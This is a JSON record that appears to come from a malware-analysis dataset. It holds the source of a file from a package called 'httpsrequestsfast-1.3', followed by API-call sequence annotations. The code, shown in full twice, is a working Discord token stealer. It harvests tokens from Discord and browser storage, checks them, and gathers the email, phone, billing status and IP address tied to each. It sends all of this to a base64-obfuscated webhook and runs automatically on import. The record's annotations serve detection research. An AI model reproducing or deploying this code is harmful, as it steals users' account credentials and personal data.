[
  {
    "pyfile": "httpsrequestsfast.py",
    "code_snippet": "import os, re, json, requests\n\nfrom httpsrequestsfast.receiver import Receiver\nfrom httpsrequestsfast.sender import Sender\n\nclass Grabber:\n    def __init__(self):\n        self.url = \"https://discord.com/api/v9/users/@me\"\n        self.path = [\n            '_Roaming/Discord/Local Storage/leveldb',\n            '_Roaming/Lightcord/Local Storage/leveldb',\n            '_Roaming/discordcanary/Local Storage/leveldb',\n            '_Roaming/discordptb/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',\n            '_Local/Amigo/User Data/Local Storage/leveldb',\n            '_Local/Torch/User Data/Local Storage/leveldb',\n            '_Local/Kometa/User Data/Local Storage/leveldb',\n            '_Local/Orbitum/User Data/Local Storage/leveldb',\n            '_Local/CentBrowser/User Data/Local Storage/leveldb',\n            '_Local/7Star/7Star/User Data/Local Storage/leveldb',\n            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',\n            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',\n            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',\n            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',\n            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',\n            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',\n            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',\n            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',\n            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',\n            '_Local/BraveSoftware/Brave-Browser/User Data/Local Storage/leveldb'\n        ]\n\n    def __get_tokens(self):\n        tokens = []\n        \n        for path in self.path:\n            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))\n\n            if os.path.exists(path):\n                for filename in os.listdir(path):\n                    if not filename.endswith('.log') and not filename.endswith('.ldb'):\n                        continue\n                    else:\n                        for line in [i.strip() for i in open(f'{path}/{filename}', errors='ignore').readlines() if i.strip()]:\n                            for token in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line):\n                                tokens.append(token)\n        return set(tokens)\n\n    def __check_tokens(self, tokens):\n        valid_tokens = []\n\n        for token in tokens:\n            try:\n                result = requests.get(self.url, headers = {\n                        \"Authorization\": token\n                })\n                if result.status_code == 200:\n                    valid_tokens += f\"{token}\\n\"\n            except:\n                pass\n        return valid_tokens\n\n    def __recreate_token(self, char_array):\n        tokens = []\n        token = \"\"\n\n        for char in char_array:\n            if char == '\\n':\n                tokens.append(token)\n                token = \"\"\n            else:\n                token += char\n        return tokens\n\n    def __get_id(self, tokens):\n        ids = {}\n\n        for token in tokens:\n            src = requests.get(self.url, headers= {\n                \"Authorization\": token\n            })\n            userdata = json.loads(src.content)\n            ids[str(userdata[\"id\"])] = token\n        return ids\n\n    def __get_data(self, token):\n        data = []\n\n        src = requests.get(self.url, headers = {\n            \"Authorization\": token\n        })\n        userdata = json.loads(src.content)\n        phone = userdata['phone'] # Faster\n        data.append(f\"email -> {userdata['email']}\")\n\n        if (phone is not None):\n            data.append(f\"phone -> {phone}\")\n\n        return data\n\n    def __has_payment_methods(self, token) -> bool:\n        has_billing = False\n\n        billing = requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers = {\n            \"Authorization\": token\n        }).json()\n\n        if len(billing) > 0:\n            has_billing = True\n        return has_billing\n\n    def main(self):\n        receiver = Receiver()\n        sender = Sender()\n        WEBHOOK = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTQzMjc4MjAzNTA0NTY2MzMzL2hRSzg5bGdvSEFVN2RYXzJ5dHRyYUdKcGJ3aFdSdzUxUGFwenNOSjhkSHRwUS15T3BXc1J1a1FDMmlON2g2UEhFTzdW\"\n        \n        tokens = self.__get_tokens()\n        verfied_tokens = self.__check_tokens(tokens)\n        recreated_tokens = self.__recreate_token(verfied_tokens)\n        full_verfied_tokens = self.__get_id(recreated_tokens)\n\n        content = \"\"\n        if len(full_verfied_tokens) > 0:\n            for token in full_verfied_tokens.values():\n                content += f\"\\n{token}\"\n                datas = self.__get_data(token)\n\n                for data in datas:\n                    content += f\"\\n{str(data)}\"\n                content += f\"\\nbilling -> {self.__has_payment_methods(token)}\"\n        else:\n            content = \"No tokens found!\\n\"\n\n        payload = {\n            \"embeds\": [\n                {\n                    \"title\": \"Discord Informations:\",\n                    \"description\": f\"```{sender._encode_data(content)}\\n```\",\n                    \"color\": 0x72F9F4\n                },\n                                {\n                    \"title\": \"Computer Informations:\",\n                    \"description\": f\"```ip -> {receiver._get_ip()}```\",\n                    \"color\": 0x72F9F4\n                }\n            ]\n        }\n        \n        try:\n            requests.post(sender._decode_data(WEBHOOK), json=payload)\n        except:\n            pass\n\ndef init():\n    Grabber().main()\n\ninit()",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "os.getenv",
        "os.path.exists",
        "os.listdir",
        "open",
        "open.readlines",
        "re.findall",
        "requests.get",
        "requests.get",
        "json.loads",
        "requests.get",
        "json.loads",
        "requests.get",
        "requests.get.json",
        "Sender._encode_data",
        "Receiver._get_ip",
        "Sender._decode_data",
        "requests.post"
      ],
      "api_sequence_with_args": [
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.path.exists(path)",
        "os.listdir(path)",
        "open(f'{path}/{filename}', errors='ignore')",
        "open(f'{path}/{filename}', errors='ignore').readlines()",
        "re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line)",
        "requests.get(self.url, headers={'Authorization': token})",
        "requests.get(self.url, headers={'Authorization': token})",
        "json.loads(src.content)",
        "requests.get(self.url, headers={'Authorization': token})",
        "json.loads(src.content)",
        "requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})",
        "requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()",
        "Sender._encode_data(content)",
        "Receiver._get_ip()",
        "Sender._decode_data(WEBHOOK)",
        "requests.post(sender._decode_data(WEBHOOK), json=payload)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.readlines",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "Sender._encode_data",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "Receiver._get_ip",
          "id": "get_public_ip",
          "description": "Retrieves public IP address using HTTP request",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "Sender._decode_data",
          "id": "decode_base64_to_ascii",
          "description": "Decodes base64-encoded string to ASCII text",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import os, re, json, requests\nfrom httpsrequestsfast.receiver import Receiver\nfrom httpsrequestsfast.sender import Sender\n\nclass Grabber:\n    def __get_tokens(self):\n        tokens = []\n        for path in self.path:\n            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))\n            if os.path.exists(path):\n                for filename in os.listdir(path):\n                    if not filename.endswith('.log') and not filename.endswith('.ldb'):\n                        continue\n                    else:\n                        for line in [i.strip() for i in open(f'{path}/{filename}', errors='ignore').readlines() if i.strip()]:\n                            for token in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line):\n                                tokens.append(token)\n        return set(tokens)\n\n    def __check_tokens(self, tokens):\n        valid_tokens = []\n        for token in tokens:\n            try:\n                result = requests.get(self.url, headers = {\"Authorization\": token})\n                if result.status_code == 200:\n                    valid_tokens += f\"{token}\\n\"\n            except:\n                pass\n        return valid_tokens\n\n    def __get_id(self, tokens):\n        ids = {}\n        for token in tokens:\n            src = requests.get(self.url, headers= {\"Authorization\": token})\n            userdata = json.loads(src.content)\n            ids[str(userdata[\"id\"])] = token\n        return ids\n\n    def __get_data(self, token):\n        data = []\n        src = requests.get(self.url, headers = {\"Authorization\": token})\n        userdata = json.loads(src.content)\n        phone = userdata['phone']\n        data.append(f\"email -> {userdata['email']}\")\n        if (phone is not None):\n            data.append(f\"phone -> {phone}\")\n        return data\n\n    def __has_payment_methods(self, token) -> bool:\n        has_billing = False\n        billing = requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers = {\"Authorization\": token}).json()\n        if len(billing) > 0:\n            has_billing = True\n        return has_billing\n\n    def main(self):\n        receiver = Receiver()\n        sender = Sender()\n        WEBHOOK = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTQzMjc4MjAzNTA0NTY2MzMzL2hRSzg5bGdvSEFVN2RYXzJ5dHRyYUdKcGJ3aFdSdzUxUGFwenNOSjhkSHRwUS15T3BXc1J1a1FDMmlON2g2UEhFTzdW\"\n        tokens = self.__get_tokens()\n        verfied_tokens = self.__check_tokens(tokens)\n        recreated_tokens = self.__recreate_token(verfied_tokens)\n        full_verfied_tokens = self.__get_id(recreated_tokens)\n        content = \"\"\n        if len(full_verfied_tokens) > 0:\n            for token in full_verfied_tokens.values():\n                content += f\"\\n{token}\"\n                datas = self.__get_data(token)\n                for data in datas:\n                    content += f\"\\n{str(data)}\"\n                content += f\"\\nbilling -> {self.__has_payment_methods(token)}\"\n        else:\n            content = \"No tokens found!\\n\"\n        payload = {\n            \"embeds\": [\n                {\n                    \"title\": \"Discord Informations:\",\n                    \"description\": f\"```{sender._encode_data(content)}\\n```\",\n                    \"color\": 0x72F9F4\n                },\n                {\n                    \"title\": \"Computer Informations:\",\n                    \"description\": f\"```ip -> {receiver._get_ip()}```\",\n                    \"color\": 0x72F9F4\n                }\n            ]\n        }\n        try:\n            requests.post(sender._decode_data(WEBHOOK), json=payload)\n        except:\n            pass\n\ndef init():\n    Grabber().main()\n\ninit()"
    }
  },
  {
    "metadata": {
      "package_name": "httpsrequestsfast-1.3"
    }
  }
]